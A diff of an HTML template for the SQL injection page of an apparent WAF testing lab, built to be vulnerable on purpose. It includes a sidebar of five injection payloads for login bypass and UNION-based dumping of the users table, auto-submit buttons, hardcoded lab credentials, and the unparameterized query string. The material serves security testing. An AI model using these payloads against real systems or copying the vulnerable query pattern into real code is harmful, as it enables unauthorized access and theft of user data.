@@ -1,138 +1,304 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 
 <head>
-    <title>SQL Injection</title>
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;600&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" href="/static/style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SQL Injection — WAF Test Lab</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600&family=Geist+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/static/style.css">
 </head>
 
 <body>
 
-    <!-- NAV -->
-    <div class="nav">
-        <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
-            <div class="nav-brand-dot"></div>
-            Vulnerability Lab
-        </div>
+  <!-- NAV -->
+  <nav class="nav">
+    <div class="nav-brand" onclick="location.href='/vuln/'" style="cursor:pointer;">
+      <div class="nav-brand-dot"></div>
+      Vulnerability Lab
+    </div>
+    <div class="nav-links">
+      <a href="/vuln/sqli"   class="nav-link active">SQLi</a>
+      <a href="/vuln/xss"    class="nav-link">XSS</a>
+      <a href="/vuln/upload" class="nav-link">Upload</a>
+      <a href="/vuln/cmdi"   class="nav-link">CMDi</a>
+      <a href="/vuln/admin"  class="nav-link">Admin</a>
+      <a href="/vuln/ssrf"   class="nav-link">SSRF</a>
+    </div>
+  </nav>
+
+  <!-- SIDEBAR TRIGGER -->
+  <button class="sidebar-trigger" id="sidebarTrigger" aria-label="Open payloads">
+    <span class="sidebar-trigger-badge badge-trigger-red">5</span>
+    <span class="sidebar-trigger-label">Payloads</span>
+    <span class="sidebar-trigger-icon">‹</span>
+  </button>
+
+  <!-- OVERLAY -->
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar" id="sidebar" aria-label="SQL Injection payloads">
+    <div class="sidebar-head">
+      <div class="sidebar-head-left">
+        <span class="sidebar-head-label">SQL Injection</span>
+        <span class="sidebar-head-title">Attack Payloads</span>
+      </div>
+      <button class="sidebar-close" id="sidebarClose" aria-label="Close">✕</button>
     </div>
 
-    <!-- PAGE -->
-    <div class="test-page">
+    <div class="sidebar-body">
 
-        <!-- LEFT -->
-        <div class="col">
+      <div class="payload-group">
+        <div class="payload-group-label">Authentication Bypass</div>
 
-            <!-- FORM -->
-            <form method="POST" id="loginForm" class="panel">
-                <div class="panel-header">Login Form</div>
-                <div class="panel-body">
-                    <input id="username" class="input" name="username" placeholder="Username"><br><br>
-                    <input id="password" class="input" name="password" placeholder="Password"><br><br>
-                    <button class="btn btn-primary">Login</button>
-                </div>
-            </form>
-
-            <!-- QUERY -->
-            {% if query_shown %}
-            <div class="panel">
-                <div class="panel-header">Executed Query</div>
-                <div class="panel-body">
-                    <code>{{ query_shown }}</code>
-                </div>
-            </div>
-            {% endif %}
-
-            <!-- RESULT -->
-            {% if result %}
-            <div class="panel">
-                <div class="panel-header">Result</div>
-                <div class="panel-body">
-                    <p><b>Status:</b> {{ result.status }}</p>
-                    <p>{{ result.message }}</p>
-
-                    {% if result.rows %}
-                    <table border="1" style="width:100%; font-size:12px;">
-                        <tr>
-                            <th>ID</th>
-                            <th>User</th>
-                            <th>Password</th>
-                            <th>Role</th>
-                        </tr>
-                        {% for row in result.rows %}
-                        <tr>
-                            <td>{{ row['id'] }}</td>
-                            <td>{{ row['username'] }}</td>
-                            <td>{{ row['password'] }}</td>
-                            <td>{{ row['role'] }}</td>
-                        </tr>
-                        {% endfor %}
-                    </table>
-                    {% endif %}
-                </div>
-            </div>
-            {% endif %}
-
+        <div class="payload-item">
+          <div class="payload-meta">
+            <span class="payload-name">Classic OR bypass</span>
+            <span class="payload-effect">Returns all matching users</span>
+          </div>
+          <div class="payload-code-row">
+            <span class="payload-code">' OR 1=1 --</span>
+            <button class="btn-use" data-payload="' OR 1=1 --">Use</button>
+          </div>
         </div>
 
-        <!-- RIGHT -->
-        <div class="col">
-
-            <!-- PAYLOADS -->
-            <div class="panel">
-                <div class="panel-header">🔥 Payload Library</div>
-                <div class="panel-body">
-
-                    <div class="payload" onclick="attack(`' OR 1=1 --`)">
-                        ' OR 1=1 -- (Bypass login)
-                    </div>
-
-                    <div class="payload" onclick="attack(`admin'--`)">
-                        admin'-- (Ignore password)
-                    </div>
-
-                    <div class="payload" onclick="attack(`admin' OR '1'='1`)">
-                        admin' OR '1'='1
-                    </div>
-
-                    <div class="payload"
-                        onclick="attack(`' UNION SELECT id,username,password,role,email FROM users--`)">
-                        UNION dump users
-                    </div>
-
-                    <div class="payload" onclick="attack(`' OR role='admin'--`)">
-                        Extract admin
-                    </div>
-
-                </div>
-            </div>
-
-            <!-- SAMPLE CREDS -->
-            <div class="panel">
-                <div class="panel-header">Sample Credentials</div>
-                <div class="panel-body">
-                    <p>admin / supersecret123</p>
-                    <p>alice / password123</p>
-                    <p>bob / letmein</p>
-                </div>
-            </div>
-
+        <div class="payload-item">
+          <div class="payload-meta">
+            <span class="payload-name">Comment termination</span>
+            <span class="payload-effect">Ignores the password check entirely</span>
+          </div>
+          <div class="payload-code-row">
+            <span class="payload-code">admin'--</span>
+            <button class="btn-use" data-payload="admin'--">Use</button>
+          </div>
         </div>
+
+        <div class="payload-item">
+          <div class="payload-meta">
+            <span class="payload-name">Always-true condition</span>
+            <span class="payload-effect">Bypasses both username and password</span>
+          </div>
+          <div class="payload-code-row">
+            <span class="payload-code">admin' OR '1'='1</span>
+            <button class="btn-use" data-payload="admin' OR '1'='1">Use</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="payload-group">
+        <div class="payload-group-label">Data Extraction</div>
+
+        <div class="payload-item">
+          <div class="payload-meta">
+            <span class="payload-name">UNION — dump all users</span>
+            <span class="payload-effect">Returns the complete users table</span>
+          </div>
+          <div class="payload-code-row">
+            <span class="payload-code">' UNION SELECT id,username,password,role,email FROM users--</span>
+            <button class="btn-use" data-payload="' UNION SELECT id,username,password,role,email FROM users--">Use</button>
+          </div>
+        </div>
+
+        <div class="payload-item">
+          <div class="payload-meta">
+            <span class="payload-name">Target admin only</span>
+            <span class="payload-effect">Extracts only the admin row</span>
+          </div>
+          <div class="payload-code-row">
+            <span class="payload-code">' OR role='admin'--</span>
+            <button class="btn-use" data-payload="' OR role='admin'--">Use</button>
+          </div>
+        </div>
+      </div>
 
     </div>
 
-    <!-- JS -->
-    <script>
-        function attack(payload) {
-            document.getElementById('username').value = payload;
-            document.getElementById('password').value = 'x';
-            document.getElementById('loginForm').submit();
-        }
-    </script>
+    <div class="sidebar-foot">
+      <p class="sidebar-foot-note">
+        Clicking <strong>Use</strong> pastes the payload into the username field and submits the form.
+      </p>
+    </div>
+  </aside>
+
+  <!-- PAGE -->
+  <main class="page">
+
+    <div class="page-header">
+      <a href="/vuln/" class="back-link">← Back to Dashboard</a>
+      <div class="header-meta">
+        <span class="tag tag-critical">Critical</span>
+        <span class="tag tag-owasp">OWASP A03 — Injection</span>
+      </div>
+      <h1 class="page-title">SQL Injection</h1>
+      <p class="page-desc">
+        This login form constructs SQL queries via raw string formatting with no parameterization.
+        Authentication can be bypassed and the full users table extracted using standard injection payloads.
+      </p>
+    </div>
+
+    <!-- LEFT -->
+    <div class="col-left">
+
+      <div class="panel">
+        <div class="panel-header">Login Form</div>
+        <div class="panel-body">
+          <form method="POST" id="loginForm" class="form">
+            <div class="field">
+              <label class="field-label" for="username">Username</label>
+              <input class="field-input" type="text" id="username" name="username"
+                placeholder="Enter username" value="{{ username if username else '' }}"
+                autocomplete="off" spellcheck="false" />
+            </div>
+            <div class="field">
+              <label class="field-label" for="password">Password</label>
+              <input class="field-input" type="text" id="password" name="password"
+                placeholder="Enter password" value="{{ password if password else '' }}"
+                autocomplete="off" spellcheck="false" />
+            </div>
+            <button class="btn btn-primary" type="submit">Login</button>
+          </form>
+        </div>
+      </div>
+
+      {% if query_shown %}
+      <div class="sql-box">
+        <div class="sql-box-label">Executed Query</div>
+        <div class="sql-box-code">{{ query_shown }}</div>
+      </div>
+      {% endif %}
+
+    </div>
+
+    <!-- RIGHT -->
+    <div class="col-right">
+
+      {% if result %}
+      <div class="result {{ result.status }}">
+        <div class="result-bar">
+          <span class="result-bar-dot"></span>
+          {% if result.status == 'success' %}Authentication Success
+          {% elif result.status == 'fail' %}Authentication Failed
+          {% else %}SQL Error{% endif %}
+        </div>
+        <div class="result-body">
+          <div class="result-msg">{{ result.message }}</div>
+          {% if result.rows %}
+          <table class="data-table">
+            <thead>
+              <tr><th>ID</th><th>Username</th><th>Password</th><th>Role</th><th>Email</th></tr>
+            </thead>
+            <tbody>
+              {% for row in result.rows %}
+              <tr>
+                <td>{{ row['id'] }}</td>
+                <td>{{ row['username'] }}</td>
+                <td class="td-pw">{{ row['password'] }}</td>
+                <td>{{ row['role'] }}</td>
+                <td>{{ row['email'] if row['email'] is defined else '' }}</td>
+              </tr>
+              {% endfor %}
+            </tbody>
+          </table>
+          {% endif %}
+        </div>
+      </div>
+      {% endif %}
+
+      <div class="cred-panel">
+        <span class="cred-label">Valid Credentials</span>
+        <div>
+          <div class="cred-title">Test with a legitimate login</div>
+          <div class="cred-desc">Verify the form works correctly before testing attack payloads.</div>
+        </div>
+        <div class="cred-rows">
+          <div class="cred-row">
+            <span class="cred-key">username</span>
+            <span class="cred-val">admin</span>
+            <button class="btn-copy-cred" data-field="username" data-value="admin">copy</button>
+          </div>
+          <div class="cred-row">
+            <span class="cred-key">password</span>
+            <span class="cred-val">supersecret123</span>
+            <button class="btn-copy-cred" data-field="password" data-value="supersecret123">copy</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="note-box">
+        <strong>Why this is vulnerable —</strong> The query is built as:<br><br>
+        <code>f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"</code><br><br>
+        No parameterization, no escaping. A WAF should detect SQL metacharacters
+        like <code>'</code>, <code>--</code>, and <code>UNION</code> in POST parameters.
+      </div>
+
+    </div>
+
+  </main>
+
+  <footer class="footer">
+    <span class="footer-left">WAF Test Lab — SQL Injection Module</span>
+    <span class="footer-right">For security testing only</span>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const trigger = document.getElementById('sidebarTrigger');
+      const sidebar = document.getElementById('sidebar');
+      const overlay = document.getElementById('sidebarOverlay');
+      const closeBtn = document.getElementById('sidebarClose');
+
+      function openSidebar() {
+        sidebar.classList.add('open');
+        overlay.classList.add('visible');
+        trigger.classList.add('open');
+        document.body.style.overflow = 'hidden';
+      }
+      function closeSidebar() {
+        sidebar.classList.remove('open');
+        overlay.classList.remove('visible');
+        trigger.classList.remove('open');
+        document.body.style.overflow = '';
+      }
+
+      trigger.addEventListener('click', () => sidebar.classList.contains('open') ? closeSidebar() : openSidebar());
+      closeBtn.addEventListener('click', closeSidebar);
+      overlay.addEventListener('click', closeSidebar);
+      document.addEventListener('keydown', e => { if (e.key === 'Escape') closeSidebar(); });
+
+      // Use buttons — paste into username, auto-submit
+      document.querySelectorAll('.btn-use[data-payload]').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const u = document.getElementById('username');
+          const p = document.getElementById('password');
+          if (u) u.value = btn.dataset.payload;
+          if (p) p.value = 'x';
+          markUsed(btn);
+          setTimeout(() => { closeSidebar(); document.getElementById('loginForm').submit(); }, 400);
+        });
+      });
+
+      // Credential copy buttons
+      document.querySelectorAll('.btn-copy-cred[data-field]').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const field = document.getElementById(btn.dataset.field);
+          if (field) field.value = btn.dataset.value;
+          navigator.clipboard.writeText(btn.dataset.value).catch(() => {});
+          const orig = btn.textContent;
+          btn.textContent = 'copied';
+          btn.classList.add('copied');
+          setTimeout(() => { btn.textContent = orig; btn.classList.remove('copied'); }, 1800);
+        });
+      });
+
+      function markUsed(btn) {
+        btn.textContent = '✓';
+        btn.classList.add('used');
+        setTimeout(() => { btn.textContent = 'Use'; btn.classList.remove('used'); }, 1800);
+      }
+    });
+  </script>
 
 </body>
-
 </html>
